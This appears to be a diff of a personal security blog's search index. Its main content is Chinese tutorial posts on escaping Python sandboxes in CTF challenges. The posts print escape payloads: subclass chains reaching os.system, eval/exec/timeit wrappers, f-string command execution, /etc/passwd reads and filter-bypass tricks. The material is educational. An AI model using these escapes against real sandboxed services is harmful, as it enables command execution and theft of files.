+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Python_Sandbox_Bypass]]></title>
     <url>%2F2018%2F06%2F05%2FPython-Sandbox-Bypass%2F</url>
-    <content type="text"><![CDATA[0x01 基础关于python沙箱逃逸的基础之前的博文写过，如果有不会的可以去看看 0x02 Python Sandbox 一般的沙箱会使用1del __builtins__.__dict__[func] 这种方式来删掉敏感的模块或者函数 0x03 常规的内联函数获取方法12[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&apos;os&apos;].system(&apos;whoami&apos;) //执行任意命令[].classes__.__base__.__subclasses__()[40](&apos;flag.txt&apos;).read() //读取文件 0x04 Bypass Function timeit 12import timeittimeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;,number=1) eval 1eval(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;) exec 12exec(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;)exec &quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot; -platform12platform.os.system(&apos;whoami&apos;)platform.popen(&apos;whoami&apos;).read() 0x05 Bypass reload方法 当del了内建模块的时候可以看看reload有没有被过滤，如果没过滤1reload(__builtins__) 寻找替代函数 可以用之前的0x03 常规的内联函数获取方法找到替代方法 字符加密 可以使用base64、rot-13这种可以可以加解密的方法绕过固定的过滤当然字符串拼接也是可以的 如果是module类型，可以使用 dict .key()来获取方法名]]></content>
+    <content type="text"><![CDATA[0x01 基础关于python沙箱逃逸的基础之前的博文写过，如果有不会的可以去看看 点我 0x02 Python Sandbox 一般的沙箱会使用1del __builtins__.__dict__[func] 这种方式来删掉敏感的模块或者函数 0x03 常规的内联函数获取方法12[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&apos;os&apos;].system(&apos;whoami&apos;) //执行任意命令[].classes__.__base__.__subclasses__()[40](&apos;flag.txt&apos;).read() //读取文件 0x04 Bypass Function timeit 12import timeittimeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;,number=1) eval 1eval(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;) exec 12exec(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;)exec &quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot; platform 12platform.os.system(&apos;whoami&apos;)platform.popen(&apos;whoami&apos;).read() execfile 12execfile(&apos;/usr/lib/python2.7/os.py&apos;) //相当于from os import *system(&apos;whoami&apos;) file,open 12file(&apos;/etc/passwd&apos;).read()open(&apos;/etc/passwd&apos;).read() map 12import osmap(os.system,[&apos;whoami&apos;]) //需要import模块 0x05 Bypass reload方法 当del了内建模块的时候可以看看reload有没有被过滤，如果没过滤1reload(__builtins__) 寻找替代函数 可以用之前的0x03 常规的内联函数获取方法找到替代方法 字符加密 可以使用base64、rot-13这种可以可以加解密的方法绕过固定的过滤当然字符串拼接也是可以的 如果是module类型，可以使用 dict .key()来获取方法名 可以使用dir(builtins)查看有哪些内置函数可以使用 不需要globals的payload 1].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&apos;whoami&apos;)]]></content>
       <categories>
         <category>Python安全</category>
       </categories>
@@ -16,7 +497,7 @@
   <entry>
     <title><![CDATA[Python沙箱逃逸之基础篇]]></title>
     <url>%2F2018%2F06%2F04%2FPython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%2F</url>
-    <content type="text"><![CDATA[0x01 前言周末去参加了一波国赛的半决赛，发现全部都是python的题，之前还以为会有人把模版改成php的呢，结果都没有。。对于python也不是很熟悉，所以回来之后学习一下。 0x02 Python一般的利用方式一般python沙箱的话都是可以执行python命令的一个环境，因此我们需要知道一些敏感的函数来帮助我们getshell或者读取敏感文件等等 执行系统命令 12345os.system(&apos;whoami&apos;)os.popen(&apos;whoami&apos;)commands.getoutput(&apos;whoami&apos;)commands.getstatusoutput(&apos;whoami&apos;)subprocess.call(&apos;whoami&apos;,shell=True) 读取文件 123456fd = os.open(&apos;flag.txt&apos;,O_RDWR)os.read(fd,1024)--------------------------------------------file(&apos;flag.txt&apos;).read() //file函数python3会移除--------------------------------------------open(&apos;flag.txt&apos;).read() f_string python3.6之后引入的新特性，作用跟format差不多，但是可以执行命令1f&quot;&#123;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&#125;&quot; 当然这些都是常见的利用方式，还有很多利用姿势等你解锁 0x03 Python之import在做沙箱逃逸的时候import是对于getshell是很重要的，因为我们肯定是需要引入其他包的功能来进行命令执行。一般import的用法如下： import关键字 import 函数 importlib库 123import os__import__(&apos;os&apos;)importlib.import_module(&apos;os&apos;) 0x04 Python之builtin在python中，不用引用直接就能使用的叫做内建模块，对于内建模块来说，我们要区分 builtin 、 builtins 、builtins这三者 对于 builtin 和builts来说，他们的区别在于 builtin 是对于Python2.x的，而builtins是对于Python3.x的，他们都是内建模块。当我们想使用内建函数，比如chr()的时候，其实是用的 builtins .chr()的 那么 builtins 和 builtin 又有什么区别呢，其实可以把 builtins 看作是 builtin 的一个引用，但是这个引用还要看作用域 当在 main 作用域的时候，两者没有任何区别，但是想要用 builtin 的时候，必须import才能使用， builtins 就不用import 当不再 main 作用域的时候，builtins 是 builtin . dict 的引用，是个字典 一般来说，在沙箱中经常会使用12import __builtin__del __builtin__.chr 这种方式把敏感的内建函数删除 0x05 Python之 dict 与 dir() dict 和 dir() 都可一查看模块/类/对象的属性和函数，但是并不是所有的模块/对象/类都有 dict 属性的，所以可以用dir()来获取全部的属性和函数 ##0x06 Python之 mro 与 base 与 base 在Python中mro可以获取一个类的所有父类的列表(按照方法解析顺序排列)1&quot;&quot;.__class__.__mro__ base返回父类 bases返回父类的tuple ##0x07 Python之 subclasses () 之前说的mro是获取父类的列表，那么subclasses就是获取子类的列表了。因此有一个思路就是，获取任意类的父类列表，找到object类，因为所有的类都是继承object类的，所有再使用subclasses来获取子类的列表，这样就能使用所有的类了。 0x08 参考https://xz.aliyun.com/t/52#toc-10http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/]]></content>
+    <content type="text"><![CDATA[0x01 前言周末去参加了一波国赛的半决赛，发现全部都是python的题，之前还以为会有人把模版改成php的呢，结果都没有。。对于python也不是很熟悉，所以回来之后学习一下。 0x02 Python一般的利用方式一般python沙箱的话都是可以执行python命令的一个环境，因此我们需要知道一些敏感的函数来帮助我们getshell或者读取敏感文件等等 执行系统命令 12345os.system(&apos;whoami&apos;)os.popen(&apos;whoami&apos;)commands.getoutput(&apos;whoami&apos;)commands.getstatusoutput(&apos;whoami&apos;)subprocess.call(&apos;whoami&apos;,shell=True) 读取文件 123456fd = os.open(&apos;flag.txt&apos;,O_RDWR)os.read(fd,1024)--------------------------------------------file(&apos;flag.txt&apos;).read() //file函数python3会移除--------------------------------------------open(&apos;flag.txt&apos;).read() f_string python3.6之后引入的新特性，作用跟format差不多，但是可以执行命令1f&quot;&#123;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&#125;&quot; 当然这些都是常见的利用方式，还有很多利用姿势等你解锁 0x03 Python之import在做沙箱逃逸的时候import是对于getshell是很重要的，因为我们肯定是需要引入其他包的功能来进行命令执行。一般import的用法如下： import关键字 __import__函数 importlib库 123import os__import__(&apos;os&apos;)importlib.import_module(&apos;os&apos;) 0x04 Python之builtin在python中，不用引用直接就能使用的叫做内建模块，对于内建模块来说，我们要区分__builtin__、__builtins__、builtins这三者 对于__builtin__和builts来说，他们的区别在于 __builtin__是对于Python2.x的，而builtins是对于Python3.x的，他们都是内建模块。当我们想使用内建函数，比如chr()的时候，其实是用的__builtins__.chr()的 那么__builtins__和__builtin__又有什么区别呢，其实可以把__builtins__看作是 builtin 的一个引用，但是这个引用还要看作用域 当在__main__作用域的时候，两者没有任何区别，但是想要用__builtin__的时候，必须import才能使用，__builtins__就不用import 当不再__main__作用域的时候__builtins__是 __builtin__.__dict__的引用，是个字典 一般来说，在沙箱中经常会使用12import __builtin__del __builtin__.chr 这种方式把敏感的内建函数删除 0x05 Python之 dict 与 dir()__dict__和dir()都可一查看模块/类/对象的属性和函数，但是并不是所有的模块/对象/类都有 __dict__属性的，所以可以用dir()来获取全部的属性和函数 0x06 Python之__mro__与__base__与__base__在Python中mro可以获取一个类的所有父类的列表(按照方法解析顺序排列)1&quot;&quot;.__class__.__mro__ base返回父类 bases返回父类的tuple 0x07 Python之__subclasses__()之前说的mro是获取父类的列表，那么subclasses就是获取子类的列表了。因此有一个思路就是，获取任意类的父类列表，找到object类，因为所有的类都是继承object类的，所有再使用subclasses来获取子类的列表，这样就能使用所有的类了。 0x09 Python之__globals__globals属性是函数特有的，记录当前文件的全局变量的值，123a=lambda x:x+1a.__globals__a.func_globals //两个返回的内容是一样的 0x08 参考https://xz.aliyun.com/t/52#toc-10http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/]]></content>
       <categories>
         <category>Python安全</category>
       </categories>
@@ -34,8 +515,8 @@
         <category>Mac OS</category>
       </categories>
       <tags>
-        <tag>Mac OS</tag>
         <tag>小贴士</tag>
+        <tag>Mac OS</tag>
       </tags>
   </entry>
   <entry>
@@ -58,10 +539,10 @@
         <category>渗透测试</category>
       </categories>
       <tags>
+        <tag>SSH</tag>
         <tag>内网渗透</tag>
         <tag>内网穿透</tag>
         <tag>端口转发</tag>
-        <tag>SSH</tag>
       </tags>
   </entry>
   <entry>
@@ -441,9 +922,9 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>Web安全</tag>
         <tag>PHP</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -454,8 +935,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>Web安全</tag>
+        <tag>反序列化</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -589,10 +1070,10 @@
         <category>Java安全</category>
       </categories>
       <tags>
+        <tag>Web安全</tag>
         <tag>Java</tag>
         <tag>Java安全</tag>
         <tag>反序列化</tag>
-        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -654,7 +1135,7 @@
   </entry>
   <entry>
     <title><![CDATA[Hello]]></title>
-    <url>%2F2018%2F05%2F30%2F1%2F</url>
+    <url>%2F2018%2F05%2F30%2FHello%2F</url>
     <content type="text"><![CDATA[Hello, This is my new blog - Pin0&apos;s Blog 之前一直在简书里写文章的，链接在这里 现在会逐步把简书的文章搬到我的博客里，各位看官要是看的不爽的，可以先收藏哦～]]></content>
       <categories>
         <category>Hello</category>
